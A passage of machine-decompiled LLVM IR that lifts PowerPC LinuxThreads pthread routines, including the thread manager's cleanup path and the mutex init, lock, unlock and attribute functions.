  %v1_10007d94 = mul i32 %v3_10007d90, 4
  store i32 %v1_10007d94, i32* %r4.global-to-local, align 4
  %v2_10007d98 = sub i32 %v1_10007d98, %v1_10007d94
  %v1_10007d9c = add i32 %v2_10007d98, 480
  store i32 %v1_10007d9c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007da4.310 to i32), i32* @lr, align 4
  %v2_10007da0 = call i32 @munmap(i32 %v1_10007d9c, i32 %v1_10007d94)
  store i32 %v2_10007da0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007da4

dec_label_pc_10007da4:                            ; preds = %dec_label_pc_10007d6c, %dec_label_pc_10007d8c
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r8.global-to-local, align 4
  %v3_10007dac = load i32, i32* @global_var_1002ef70.296, align 4
  store i32 ptrtoint (i32* @global_var_1002abe0.262 to i32), i32* %r9.global-to-local, align 4
  %v0_10007db4 = load i32, i32* %r24.global-to-local, align 4
  %v1_10007db4 = mul i32 %v0_10007db4, 16
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10007dbc = add i32 %v1_10007db4, ptrtoint (i32* @global_var_1002abe0.262 to i32)
  store i32 %v2_10007dbc, i32* %r11.global-to-local, align 4
  %v1_10007dc0 = add i32 %v3_10007dac, -1
  store i32 %v1_10007dc0, i32* %r10.global-to-local, align 4
  %v2_10007dc4 = add i32 %v1_10007db4, add (i32 ptrtoint (i32* @global_var_1002abe0.262 to i32), i32 12)
  %v3_10007dc4 = inttoptr i32 %v2_10007dc4 to i32*
  store i32 0, i32* %v3_10007dc4, align 4
  %v0_10007dc8 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10007dc8, i32* @global_var_1002ef70.296, align 4
  %v0_10007dcc = load i32, i32* %r0.global-to-local, align 4
  %v1_10007dcc = load i32, i32* %r11.global-to-local, align 4
  %v2_10007dcc = add i32 %v1_10007dcc, 8
  %v3_10007dcc = inttoptr i32 %v2_10007dcc to i32*
  store i32 %v0_10007dcc, i32* %v3_10007dcc, align 4
  %v0_10007dd0 = call i32 @__errno_location()
  store i32 %v0_10007dd0, i32* %r3.global-to-local, align 4
  %v1_10007dd4 = inttoptr i32 %v0_10007dd0 to i32*
  %v2_10007dd4 = load i32, i32* %v1_10007dd4, align 4
  store i32 %v2_10007dd4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007df0

dec_label_pc_10007ddc:                            ; preds = %dec_label_pc_10007b44
  store i32 11, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007df0

dec_label_pc_10007de4:                            ; preds = %dec_label_pc_10007d48
  %v1_10007de4 = load i32, i32* @r31, align 4
  %v2_10007de4 = add i32 %v1_10007de4, 20
  %v3_10007de4 = inttoptr i32 %v2_10007de4 to i32*
  store i32 %v0_10007de4, i32* %v3_10007de4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10007dec = load i32, i32* %r28.global-to-local, align 4
  %v1_10007dec = load i32, i32* %r23.global-to-local, align 4
  %v2_10007dec = add i32 %v1_10007dec, 48
  %v3_10007dec = inttoptr i32 %v2_10007dec to i32*
  store i32 %v0_10007dec, i32* %v3_10007dec, align 4
  %v0_10007df0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007df0

dec_label_pc_10007df0:                            ; preds = %dec_label_pc_10007a0c, %dec_label_pc_10007ddc, %dec_label_pc_10007da4, %dec_label_pc_10007de4
  %v0_10007df0 = phi i32 [ 1, %dec_label_pc_10007a0c ], [ 11, %dec_label_pc_10007ddc ], [ %v2_10007dd4, %dec_label_pc_10007da4 ], [ %v0_10007df0.pre, %dec_label_pc_10007de4 ]
  %v1_10007df0 = load i32, i32* %r23.global-to-local, align 4
  %v2_10007df0 = add i32 %v1_10007df0, 52
  %v3_10007df0 = inttoptr i32 %v2_10007df0 to i32*
  store i32 %v0_10007df0, i32* %v3_10007df0, align 4
  %v3_10007df4 = load i32, i32* %stack_var_-224, align 4
  store i32 %v3_10007df4, i32* @r3, align 4
  br label %dec_label_pc_10007f00

dec_label_pc_10007f00:                            ; preds = %dec_label_pc_10007960, %dec_label_pc_10007df0
  store i32 268467972, i32* @lr, align 4
  %v0_10007f00 = call i32 @restart.4()
  store i32 %v0_10007f00, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007940

; uselistorder directives
  uselistorder i32 %v1_10007db4, { 1, 0 }
  uselistorder i32 %v1_10007d94, { 2, 1, 0 }
  uselistorder i32 %v0_10007d00, { 1, 0 }
  uselistorder i32 %v0_10007cd4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10007bcc, { 1, 0 }
  uselistorder i32 %v1_10007b80, { 1, 0 }
  uselistorder i32 %v0_10007b4c, { 1, 0, 2 }
  uselistorder i32 %v1_10007b44, { 2, 3, 1, 0 }
  uselistorder i32 %v3_10007b0c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10007adc, { 2, 1, 0 }
  uselistorder i32 %v2_10007ad0, { 1, 0 }
  uselistorder i32 %v2_10007aac, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10007a94, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10007a94, { 1, 0, 2 }
  uselistorder i32 %v3_10007a60, { 1, 0, 2 }
  uselistorder i1 %v3_10007a44, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10007a44, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_10007a2c, { 1, 0 }
  uselistorder i32 %v0_10007acc, { 2, 0, 1 }
  uselistorder i32 %v3_100079e0, { 1, 0, 2 }
  uselistorder i32 %v2_10007888, { 3, 2, 1, 0, 5, 4, 7, 6, 9, 8 }
  uselistorder i32* %stack_var_-360, { 1, 0 }
  uselistorder i32 %tmp16, { 1, 0, 2, 3 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 21, 22, 18, 19, 23, 24, 25, 27, 26 }
  uselistorder i32* %r3.global-to-local, { 30, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 33, 34, 35, 31, 32, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 46, 48, 49, 0 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r26.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r25.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r24.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 31, 21, 22, 23, 24, 26, 25, 20, 28, 27, 29, 30 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 3, 4, 32, 5, 6, 7, 8, 9, 10, 19, 11, 12, 13, 14, 15, 16, 17, 18, 33, 20, 30, 31, 22, 23, 24, 21, 25, 26, 27, 28, 29 }
  uselistorder i32 ()* @restart.4, { 1, 0 }
  uselistorder i32 (i32, i32)* @munmap, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__linuxthreads_create_event, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @clone, { 3, 2, 1, 0 }
  uselistorder i32 3840, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @sched_getparam, { 1, 0 }
  uselistorder i32 (i32)* @sched_getscheduler, { 1, 0 }
  uselistorder i32 480, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 2097152, { 4, 1, 5, 2, 3, 0 }
  uselistorder i32 ()* @__GI_getpagesize, { 0, 3, 2, 1 }
  uselistorder i32 ()* @getppid, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10018954.306 to i32), { 0, 2, 1 }
  uselistorder i32 (i32)* @__pthread_manager_adjust_prio, { 2, 1, 0 }
  uselistorder i32* @global_var_1002ef30, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @global_var_1002a988.299, { 1, 0 }
  uselistorder label %dec_label_pc_10007f00, { 1, 0 }
  uselistorder label %dec_label_pc_10007df0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10007da4, { 1, 0 }
  uselistorder label %dec_label_pc_10007d8c, { 1, 0 }
  uselistorder label %dec_label_pc_10007d50, { 1, 0 }
  uselistorder label %dec_label_pc_10007d48, { 1, 0 }
  uselistorder label %dec_label_pc_10007c4c, { 1, 0 }
  uselistorder label %dec_label_pc_10007c44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007b4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007ac0, { 1, 0 }
  uselistorder label %dec_label_pc_10007a28, { 1, 0 }
  uselistorder label %dec_label_pc_1000798c, { 1, 0 }
  uselistorder label %dec_label_pc_10007940, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_10007934, { 1, 0 }
  uselistorder label %dec_label_pc_100078e8, { 2, 0, 1 }
}

define i32 @__pthread_manager_event(i32 %arg1) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  %v3_10007f58 = load i32, i32* bitcast (i32** @global_var_1002a95c.250 to i32*), align 4
  store i32 %v3_10007f58, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002a940.248 to i32), i32* @r2, align 4
  store i32 268468072, i32* @lr, align 4
  %v0_10007f64 = call i32 @__pthread_lock()
  %v3_10007f68 = load i32, i32* bitcast (i32** @global_var_1002a95c.250 to i32*), align 4
  store i32 %v3_10007f68, i32* @r3, align 4
  store i32 268468080, i32* @lr, align 4
  %v0_10007f6c = call i32 @__pthread_unlock()
  %v0_10007f70 = load i32, i32* %r28.global-to-local, align 4
  %v1_10007f74 = call i32 @__pthread_manager(i32 %v0_10007f70)
  ret i32 %v1_10007f74

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_1002a940.248 to i32), { 2, 3, 6, 1, 4, 7, 0, 5, 8 }
}

define i32 @__pthread_trylock(i32* %arg1) local_unnamed_addr {
entry:
  %v2_10007f7c6 = load i32, i32* %arg1, align 4
  %v3_10007f807 = icmp eq i32 %v2_10007f7c6, 0
  br i1 %v3_10007f807, label %dec_label_pc_10007f90.lr.ph, label %dec_label_pc_10007f88

dec_label_pc_10007f90.lr.ph:                      ; preds = %entry
  %r11.promoted.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10007f90

dec_label_pc_10007f88:                            ; preds = %dec_label_pc_10007fa4, %entry
  ret i32 16

dec_label_pc_10007f90:                            ; preds = %dec_label_pc_10007f90.lr.ph, %dec_label_pc_10007fa4
  %v5_10007f94 = icmp eq i32 %r11.promoted.pre, 0
  br i1 %v5_10007f94, label %dec_label_pc_10007fb0, label %dec_label_pc_10007fa4

dec_label_pc_10007fa4:                            ; preds = %dec_label_pc_10007f90
  %v2_10007f7c = load i32, i32* %arg1, align 4
  %v3_10007f80 = icmp eq i32 %v2_10007f7c, 0
  br i1 %v3_10007f80, label %dec_label_pc_10007f90, label %dec_label_pc_10007f88

dec_label_pc_10007fb0:                            ; preds = %dec_label_pc_10007f90
  store i32 0, i32* @r11, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007f90, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32* %arg1) local_unnamed_addr {
entry:
  %v2_10007fbc6 = load i32, i32* %arg1, align 4
  %v3_10007fc07 = icmp eq i32 %v2_10007fbc6, 0
  br i1 %v3_10007fc07, label %dec_label_pc_10007fd0.lr.ph, label %dec_label_pc_10007fc8

dec_label_pc_10007fd0.lr.ph:                      ; preds = %entry
  %r11.promoted.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10007fd0

dec_label_pc_10007fc8:                            ; preds = %dec_label_pc_10007fe4, %entry
  ret i32 16

dec_label_pc_10007fd0:                            ; preds = %dec_label_pc_10007fd0.lr.ph, %dec_label_pc_10007fe4
  %v5_10007fd4 = icmp eq i32 %r11.promoted.pre, 0
  br i1 %v5_10007fd4, label %dec_label_pc_10007ff0, label %dec_label_pc_10007fe4

dec_label_pc_10007fe4:                            ; preds = %dec_label_pc_10007fd0
  %v2_10007fbc = load i32, i32* %arg1, align 4
  %v3_10007fc0 = icmp eq i32 %v2_10007fbc, 0
  br i1 %v3_10007fc0, label %dec_label_pc_10007fd0, label %dec_label_pc_10007fc8

dec_label_pc_10007ff0:                            ; preds = %dec_label_pc_10007fd0
  ret i32 0

; uselistorder directives
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007fd0, { 1, 0 }
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_10007ff8 = icmp eq i32* %arg2, null
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10008000 = add i32 %arg1, 20
  %v3_10008000 = inttoptr i32 %v2_10008000 to i32*
  store i32 0, i32* %v3_10008000, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v0_10008008 = load i32, i32* %r0.global-to-local, align 4
  %v2_10008008 = add i32 %arg1, 16
  %v3_10008008 = inttoptr i32 %v2_10008008 to i32*
  store i32 %v0_10008008, i32* %v3_10008008, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  br i1 %v3_10007ff8, label %dec_label_pc_10008018, label %dec_label_pc_10008014

dec_label_pc_10008014:                            ; preds = %entry
  %v2_10008014 = load i32, i32* %arg2, align 4
  store i32 %v2_10008014, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008018

dec_label_pc_10008018:                            ; preds = %entry, %dec_label_pc_10008014
  %v0_10008018 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008018 = add i32 %arg1, 8
  %v3_10008018 = inttoptr i32 %v2_10008018 to i32*
  store i32 %v0_10008018, i32* %v3_10008018, align 4
  %v0_1000801c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000801c = add i32 %arg1, 12
  %v3_1000801c = inttoptr i32 %v2_1000801c to i32*
  store i32 %v0_1000801c, i32* %v3_1000801c, align 4
  %v0_10008020 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008020 = add i32 %arg1, 4
  %v3_10008020 = inttoptr i32 %v2_10008020 to i32*
  store i32 %v0_10008020, i32* %v3_10008020, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_10008018, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000802c = add i32 %arg1, 12
  %v2_1000802c = inttoptr i32 %v1_1000802c to i32*
  %v3_1000802c = load i32, i32* %v2_1000802c, align 4
  %v1_10008034 = icmp slt i32 %v3_1000802c, 0
  br i1 %v1_10008034, label %dec_label_pc_10008078, label %dec_label_pc_10008040

dec_label_pc_10008040:                            ; preds = %entry
  %tmp = icmp slt i32 %v3_1000802c, 2
  br i1 %tmp, label %dec_label_pc_10008050, label %dec_label_pc_10008048

dec_label_pc_10008048:                            ; preds = %dec_label_pc_10008040
  %tmp2 = icmp slt i32 %v3_1000802c, 4
  br i1 %tmp2, label %dec_label_pc_10008060, label %dec_label_pc_10008078

dec_label_pc_10008050:                            ; preds = %dec_label_pc_10008040
  %v1_10008050 = add i32 %arg1, 16
  %v2_10008050 = inttoptr i32 %v1_10008050 to i32*
  %v3_10008050 = load i32, i32* %v2_10008050, align 4
  %v1_10008054 = urem i32 %v3_10008050, 2
  %v3_10008054 = icmp eq i32 %v1_10008054, 0
  br i1 %v3_10008054, label %dec_label_pc_10008074, label %dec_label_pc_1000806c

dec_label_pc_10008060:                            ; preds = %dec_label_pc_10008048
  %v1_10008060 = add i32 %arg1, 16
  %v2_10008060 = inttoptr i32 %v1_10008060 to i32*
  %v3_10008060 = load i32, i32* %v2_10008060, align 4
  %v3_10008064 = icmp eq i32 %v3_10008060, 0
  br i1 %v3_10008064, label %dec_label_pc_10008074, label %dec_label_pc_1000806c

dec_label_pc_1000806c:                            ; preds = %dec_label_pc_10008050, %dec_label_pc_10008060
  br label %dec_label_pc_10008078

dec_label_pc_10008074:                            ; preds = %dec_label_pc_10008050, %dec_label_pc_10008060
  br label %dec_label_pc_10008078

dec_label_pc_10008078:                            ; preds = %dec_label_pc_10008048, %entry, %dec_label_pc_1000806c, %dec_label_pc_10008074
  %v0_10008078 = phi i32 [ 22, %dec_label_pc_10008048 ], [ 22, %entry ], [ 16, %dec_label_pc_1000806c ], [ 0, %dec_label_pc_10008074 ]
  ret i32 %v0_10008078

; uselistorder directives
  uselistorder label %dec_label_pc_10008078, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10008074, { 1, 0 }
  uselistorder label %dec_label_pc_1000806c, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10008098 = icmp ugt i32 %arg2, 3
  br i1 %v2_10008098, label %dec_label_pc_100080ac, label %dec_label_pc_100080a4

dec_label_pc_100080a4:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_100080ac

dec_label_pc_100080ac:                            ; preds = %entry, %dec_label_pc_100080a4
  %v0_100080ac = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_100080a4 ]
  ret i32 %v0_100080ac

; uselistorder directives
  uselistorder label %dec_label_pc_100080ac, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_100080b4 = load i32, i32* %arg1, align 4
  %v2_100080bc = inttoptr i32 %arg2 to i32*
  store i32 %v2_100080b4, i32* %v2_100080bc, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100080d4 = icmp eq i32 %arg1, 0
  %v2_100080d4 = icmp ugt i32 %arg1, 1
  %v0_100080e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_100080d4, i32 %v0_100080e4)
  %v1_100080ec = select i1 %v1_100080d4, i32 0, i32 38
  ret i32 %v1_100080ec
}

define i32 @__pthread_once_fork_child(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000810c = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_1002f504.313 to i32), i32* null)
  %v3_1000811c = call i32 @pthread_cond_init(i32* nonnull @global_var_1002f51c.314, i32 0)
  %v3_10008124 = load i32, i32* @global_var_1002f040.315, align 4
  %v3_10008130 = icmp sgt i32 %v3_10008124, 2147483643
  %v1_10008134 = add i32 %v3_10008124, 4
  br i1 %v3_10008130, label %dec_label_pc_10008144, label %dec_label_pc_1000814c

dec_label_pc_10008144:                            ; preds = %entry
  br label %dec_label_pc_1000814c

dec_label_pc_1000814c:                            ; preds = %entry, %dec_label_pc_10008144
  %storemerge = phi i32 [ 0, %dec_label_pc_10008144 ], [ %v1_10008134, %entry ]
  store i32 %storemerge, i32* @global_var_1002f040.315, align 4
  ret i32 %v3_1000811c

; uselistorder directives
  uselistorder label %dec_label_pc_1000814c, { 1, 0 }
}

define i32 @pthread_mutex_unlock() local_unnamed_addr {
entry:
  %v0_10008168 = load i32, i32* @r3, align 4
  %v1_10008168 = add i32 %v0_10008168, 12
  %v2_10008168 = inttoptr i32 %v1_10008168 to i32*
  %v3_10008168 = load i32, i32* %v2_10008168, align 4
  %v3_1000816c = icmp eq i32 %v3_10008168, 1
  br i1 %v3_1000816c, label %dec_label_pc_1000819c, label %dec_label_pc_10008174

dec_label_pc_10008174:                            ; preds = %entry
  %v2_1000816c = icmp sgt i32 %v3_10008168, 1
  br i1 %v2_1000816c, label %dec_label_pc_10008184, label %dec_label_pc_10008178

dec_label_pc_10008178:                            ; preds = %dec_label_pc_10008174
  %v3_10008178 = icmp eq i32 %v3_10008168, 0
  br i1 %v3_10008178, label %dec_label_pc_100081cc, label %dec_label_pc_10008194

dec_label_pc_10008184:                            ; preds = %dec_label_pc_10008174
  %v3_10008184 = icmp eq i32 %v3_10008168, 2
  br i1 %v3_10008184, label %dec_label_pc_100081dc, label %dec_label_pc_1000818c

dec_label_pc_1000818c:                            ; preds = %dec_label_pc_10008184
  %v3_1000818c = icmp eq i32 %v3_10008168, 3
  br i1 %v3_1000818c, label %dec_label_pc_100081fc, label %dec_label_pc_10008194

dec_label_pc_10008194:                            ; preds = %dec_label_pc_10008178, %dec_label_pc_1000818c
  store i32 22, i32* @r9, align 4
  br label %dec_label_pc_1000820c

dec_label_pc_1000819c:                            ; preds = %entry
  %v1_1000819c = add i32 %v0_10008168, 8
  %v2_1000819c = inttoptr i32 %v1_1000819c to i32*
  %v3_1000819c = load i32, i32* %v2_1000819c, align 4
  %v1_100081a0 = load i32, i32* @r2, align 4
  %v4_100081a0 = icmp eq i32 %v3_1000819c, %v1_100081a0
  br i1 %v4_100081a0, label %dec_label_pc_100081a8, label %dec_label_pc_10008208

dec_label_pc_100081a8:                            ; preds = %dec_label_pc_1000819c
  %v1_100081a8 = add i32 %v0_10008168, 4
  %v2_100081a8 = inttoptr i32 %v1_100081a8 to i32*
  %v3_100081a8 = load i32, i32* %v2_100081a8, align 4
  %tmp6 = icmp slt i32 %v3_100081a8, 1
  br i1 %tmp6, label %dec_label_pc_100081c4, label %dec_label_pc_100081b4

dec_label_pc_100081b4:                            ; preds = %dec_label_pc_100081a8
  %v1_100081b4 = add i32 %v3_100081a8, -1
  store i32 0, i32* @r9, align 4
  store i32 %v1_100081b4, i32* %v2_100081a8, align 4
  %v0_10008210.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_1000820c

dec_label_pc_100081c4:                            ; preds = %dec_label_pc_100081a8
  store i32 0, i32* %v2_1000819c, align 4
  %v0_100081cc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100081cc

dec_label_pc_100081cc:                            ; preds = %dec_label_pc_10008178, %dec_label_pc_100081c4
  %v0_100081cc = phi i32 [ %v0_10008168, %dec_label_pc_10008178 ], [ %v0_100081cc.pre, %dec_label_pc_100081c4 ]
  %v1_100081cc = add i32 %v0_100081cc, 16
  store i32 %v1_100081cc, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100081d4.316 to i32), i32* @lr, align 4
  %v0_100081d0 = call i32 @__pthread_unlock()
  br label %dec_label_pc_100081d4

dec_label_pc_100081d4:                            ; preds = %dec_label_pc_100081fc, %dec_label_pc_100081cc
  store i32 0, i32* @r9, align 4
  br label %dec_label_pc_1000820c

dec_label_pc_100081dc:                            ; preds = %dec_label_pc_10008184
  %v1_100081dc = add i32 %v0_10008168, 8
  %v2_100081dc = inttoptr i32 %v1_100081dc to i32*
  %v3_100081dc = load i32, i32* %v2_100081dc, align 4
  %v1_100081e0 = load i32, i32* @r2, align 4
  %v4_100081e0 = icmp eq i32 %v3_100081dc, %v1_100081e0
  br i1 %v4_100081e0, label %dec_label_pc_100081e8, label %dec_label_pc_10008208

dec_label_pc_100081e8:                            ; preds = %dec_label_pc_100081dc
  %v1_100081e8 = add i32 %v0_10008168, 16
  %v2_100081e8 = inttoptr i32 %v1_100081e8 to i32*
  %v3_100081e8 = load i32, i32* %v2_100081e8, align 4
  %v3_100081ec = icmp eq i32 %v3_100081e8, 0
  br i1 %v3_100081ec, label %dec_label_pc_10008208, label %dec_label_pc_100081f4

dec_label_pc_100081f4:                            ; preds = %dec_label_pc_100081e8
  store i32 0, i32* %v2_100081dc, align 4
  %v0_100081fc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100081fc

dec_label_pc_100081fc:                            ; preds = %dec_label_pc_1000818c, %dec_label_pc_100081f4
  %v0_100081fc = phi i32 [ %v0_10008168, %dec_label_pc_1000818c ], [ %v0_100081fc.pre, %dec_label_pc_100081f4 ]
  %v1_100081fc = add i32 %v0_100081fc, 16
  store i32 268468740, i32* @lr, align 4
  %v1_10008200 = inttoptr i32 %v1_100081fc to i32*
  %v2_10008200 = call i32 @__pthread_alt_unlock(i32* %v1_10008200)
  br label %dec_label_pc_100081d4

dec_label_pc_10008208:                            ; preds = %dec_label_pc_1000819c, %dec_label_pc_100081dc, %dec_label_pc_100081e8
  store i32 1, i32* @r9, align 4
  br label %dec_label_pc_1000820c

dec_label_pc_1000820c:                            ; preds = %dec_label_pc_10008194, %dec_label_pc_100081d4, %dec_label_pc_100081b4, %dec_label_pc_10008208
  %v0_10008210 = phi i32 [ 22, %dec_label_pc_10008194 ], [ 0, %dec_label_pc_100081d4 ], [ %v0_10008210.pre, %dec_label_pc_100081b4 ], [ 1, %dec_label_pc_10008208 ]
  ret i32 %v0_10008210

; uselistorder directives
  uselistorder i32 %v0_10008168, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder label %dec_label_pc_1000820c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10008208, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100081fc, { 1, 0 }
  uselistorder label %dec_label_pc_100081cc, { 1, 0 }
  uselistorder label %dec_label_pc_10008194, { 1, 0 }
}

define i32 @__pthread_once_fork_parent(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1002f504.313 to i32), i32* @r3, align 4
  %v0_10008228 = call i32 @pthread_mutex_unlock()
  ret i32 %v0_10008228
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_10008240 = add i32 %arg1, 12
  %v2_10008240 = inttoptr i32 %v1_10008240 to i32*
  %v3_10008240 = load i32, i32* %v2_10008240, align 4
  %v3_10008244 = icmp eq i32 %v3_10008240, 1
  br i1 %v3_10008244, label %dec_label_pc_10008284, label %dec_label_pc_1000824c

dec_label_pc_1000824c:                            ; preds = %entry
  %v2_10008244 = icmp sgt i32 %v3_10008240, 1
  br i1 %v2_10008244, label %dec_label_pc_1000825c, label %dec_label_pc_10008250

dec_label_pc_10008250:                            ; preds = %dec_label_pc_1000824c
  %v3_10008250 = icmp eq i32 %v3_10008240, 0
  br i1 %v3_10008250, label %dec_label_pc_10008274, label %dec_label_pc_1000826c

dec_label_pc_1000825c:                            ; preds = %dec_label_pc_1000824c
  %v3_1000825c = icmp eq i32 %v3_10008240, 2
  br i1 %v3_1000825c, label %dec_label_pc_100082c4, label %dec_label_pc_10008264

dec_label_pc_10008264:                            ; preds = %dec_label_pc_1000825c
  %v3_10008264 = icmp eq i32 %v3_10008240, 3
  br i1 %v3_10008264, label %dec_label_pc_100082f0, label %dec_label_pc_1000826c

dec_label_pc_1000826c:                            ; preds = %dec_label_pc_10008250, %dec_label_pc_10008264
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008300

dec_label_pc_10008274:                            ; preds = %dec_label_pc_10008250
  %v1_10008274 = add i32 %arg1, 16
  store i32 %v1_10008274, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10008280.317 to i32), i32* @lr, align 4
  %v0_1000827c = call i32 @__pthread_lock()
  br label %dec_label_pc_100082fc

dec_label_pc_10008284:                            ; preds = %entry
  %v1_10008284 = add i32 %arg1, 8
  %v2_10008284 = inttoptr i32 %v1_10008284 to i32*
  %v3_10008284 = load i32, i32* %v2_10008284, align 4
  %v0_10008288 = load i32, i32* @r2, align 4
  store i32 %v0_10008288, i32* @r30, align 4
  %v4_1000828c = icmp eq i32 %v3_10008284, %v0_10008288
  br i1 %v4_1000828c, label %dec_label_pc_10008294, label %dec_label_pc_100082a8

dec_label_pc_10008294:                            ; preds = %dec_label_pc_10008284
  %v1_10008294 = add i32 %arg1, 4
  %v2_10008294 = inttoptr i32 %v1_10008294 to i32*
  %v3_10008294 = load i32, i32* %v2_10008294, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000829c = add i32 %v3_10008294, 1
  store i32 %v1_1000829c, i32* @r9, align 4
  store i32 %v1_1000829c, i32* %v2_10008294, align 4
  br label %dec_label_pc_10008300

dec_label_pc_100082a8:                            ; preds = %dec_label_pc_10008284
  %v1_100082a8 = add i32 %arg1, 16
  store i32 %v1_100082a8, i32* @r3, align 4
  store i32 %v0_10008288, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_100082b4.318 to i32), i32* @lr, align 4
  %v0_100082b0 = call i32 @__pthread_lock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100082bc = load i32, i32* @r31, align 4
  %v2_100082bc = add i32 %v1_100082bc, 4
  %v3_100082bc = inttoptr i32 %v2_100082bc to i32*
  store i32 0, i32* %v3_100082bc, align 4
  br label %dec_label_pc_100082e8

dec_label_pc_100082c4:                            ; preds = %dec_label_pc_1000825c
